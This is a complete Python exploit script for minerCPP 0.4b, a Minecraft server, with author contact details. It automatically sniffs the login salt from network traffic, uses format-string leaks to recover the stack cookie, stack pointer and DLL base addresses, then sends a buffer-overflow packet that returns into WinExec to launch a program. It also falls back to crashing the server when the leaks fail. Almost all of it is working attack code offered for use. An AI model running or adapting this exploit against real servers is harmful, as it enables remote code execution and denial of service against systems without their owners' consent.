#!/usr/bin/env python
#minerCPP 0.4b Remote BOF+Format String Attack Exploit
#Software Link: http://sourceforge.net/projects/minercpp/
#Author: l3D
#Sites: http://xraysecurity.blogspot.com, http://nullbyte.org.il
#IRC: irc://irc.nix.co.il
#Email: pupipup33@gmail.com
#Tested on Windows 7

#In order to make this exploit work you should sniff the salt first.
#It's sent by the software to www.minecraft.net
#You can find it in the POST data (salt=12345 for instance).
#I added a part that sniffs it automatically using pcapy. 
#Furthermore, in a real attack it can be simply brute
#forced (it's only rand()). I didn't add this part in
#order to prevent abusing.

#The EAX can be influenced and the stack too.
#However, there is a stack cookie that
#prevents us to jump into our overwritten RET.
#There are no SEH nor vtable overwritings.

#So what can we do?...
#I found a format string attack vulnerability
#which lets us calculate the master cookie
#and get the ESP of the current thread.
#Unfortunately, the BOF is in another
#thread, so the ESP we've got may not match
#the ESP we need, what makes this exploit unstable.

#Code execution worked to me 10 out of 50 times.

from socket import *
from time import sleep
import pcapy, hashlib, re, struct, os, sys

print 'minerCPP 0.4b Remote BOF+Format String Attack by l3D (pupipup33@gmail.com)\n'

if len(sys.argv) < 3:
	print 'Usage: python %s <host> <port> [salt]' % sys.argv[0]
	print 'If salt is not specified, the exploit sniffs it automatically.'

if len(sys.argv) > 3:
	salt=sys.argv[3]
else:
	dev=pcapy.lookupdev()
	cap=pcapy.open_live(dev, 1024, False, 0)
	cap.setfilter("dst 69.175.14.242 and dst port 80")
	data=cap.next()[1]
	while 1:
		salt=re.findall(r'salt=(\d+)', data)
		if salt:
			salt=salt[0]
			break
		data=cap.next()[1]

host=sys.argv[1]
port=int(sys.argv[2])

exp=re.compile(r'0X([0-9A-F]+)')

def md5_calc(input):
	o=hashlib.md5(input)
	output=o.hexdigest()
	del o
	return output

def pack_login(nick, x):
	login='\x00\x07'
	if x:
		nick_hash=md5_calc(salt+nick)
		nick=nick.ljust(64)
		return login+nick+nick_hash
	else:
		return login+nick+'\x20'

def pack_msg(nick, x):
	msg='\x0d\x7e'
	if x:
		content='/pinfo %s ' % nick
		content=content.ljust(64, 'A')
	else:
		content='/pinfo '+nick
		content=content.ljust(64)
	return msg+content

def send_and_run(packet):
	sock=socket(AF_INET, SOCK_STREAM)
	sock.connect((host, port))
	sock.send(packet)
	sleep(1)
	sock.close()
	del sock

sleep(2)

##############################################################################################

print '[1] Stage 1: Cookie and KERNELBASE.dll ImageBase Getting'
nick='%s.%#X.%#X'
trys=0
packet=pack_msg(nick, True)

try:
	sock=socket(AF_INET, SOCK_STREAM)
	sock.connect((host, port))
	sock.send(pack_login(nick, True))
except:
	exit('[-] ERROR: Sockets error.')

data=sock.recv(2048)
while data:
	if data[0]=='\x00':
		print '[+] Logged in successfuly!'
		sock.send(packet)
	if data[0]=='\x0e':
		sock.close()
		exit('[-] ERROR: Wrong salt.')
	if data.startswith('\x0d\x00&e') and ' is a &7' in data:
		print '[+] Data has been recieved!'
		nums=[int(i, 16) for i in exp.findall(data[4:])]
		if nums:
			data=data[4:data.find('.0X')]
			if len(data)<8:
				if trys < 20:
					print '[!] Data is too short, trying again...'
					trys+=1
					sleep(1)
					sock.send(packet)
				else:
					print '[-] ERROR: Too much trys. DoSing...'
					sock.close()
					sleep(1)
					send_and_run(pack_login('A'*128, False))
					exit()
			else:
				esp=nums[1]-0xf0
				kernelbase, xored_esp=struct.unpack('2L', data)
				cookie=xored_esp^esp
				kernelbase-=0x1671
				print '[+] Stage 1 completed.'
				break
		else:
			sock.close()
			exit('[-] ERROR: addresses couldn\'t be found.')
	data=sock.recv(2048)

sock.close()
del sock
print
sleep(2)

##############################################################################################

print '[2] Stage 2: minerCPP.exe and kernel32.dll ImageBases Getting'
nick='%#X.%#X.%s'
packet=pack_msg(nick, False)

try:
	sock=socket(AF_INET, SOCK_STREAM)
	sock.connect((host, port))
	sock.send(pack_login(nick, True))
except:
	exit('[-] ERROR: Sockets error.')

data=sock.recv(2048)
while data:
	if data[0]=='\x00':
		print '[+] Logged in successfuly!'
		sock.send(packet)
	if data.startswith('\x0d\x00&e') and ' is a &7' in data:
		print '[+] Data has been recieved!'
		data=data[4:data.find(' is a &7')]
		data=exp.sub('', data, 2)[2:10]
		if len(data)==7:
			data+='\0'
		if len(data) < 8:
			sock.close()
			exit('[-] Data is too short, it can be because one of the adresses contains nullbyte...')
		else:
			kernel32, minerCPP=struct.unpack('2L', data)
			kernel32-=0x4ef88
			minerCPP-=0x5621
			print '[+] Stage 2 completed.'
			break
	data=sock.recv(2048)

sock.close()
del sock
print

##############################################################################################

print '[~] Analyzed data:'
print '[+] ESP: 0x%08x' % esp
print '[+] Cookie: 0x%08x' % cookie
print '[+] KERNELBASE.dll: 0x%08x' % kernelbase
print '[+] kernel32.dll: 0x%08x' % kernel32
print '[+] minerCPP.exe: 0x%08x' % minerCPP
print
sleep(2)

##############################################################################################

print '[3] Stage 3: Buffer Overflow'

esp+=0x50
winexec=struct.pack('L', kernel32+0x8e76d)
exitprocess=struct.pack('L', kernel32+0x52aef)
calc=struct.pack('L', esp+0x98)

junk='A'*(64-len(salt))
xored_esp=struct.pack('L', esp^cookie)
ret=winexec #jump to WinExec @ kernel32.dll
ret+='JUNK'
ret+='\x10\x01\x01\x10' #readable address @ zlib1.dll
ret+=exitprocess #jump to ExitProcess @ kernel32.dll
ret+=calc #the place of the string in the stack
ret+='\x01\xFF\xFF\xFF'
ret+='JUNK'
ret+='\xFF\xFF\xFF\xFF' #exit code -1
ret+='calc' #a program to execute

packet=pack_login(junk+xored_esp+ret, False)

send_and_run(packet)
print '[+] Packet has been sent. The server should be DoSed or a code should be executed.'
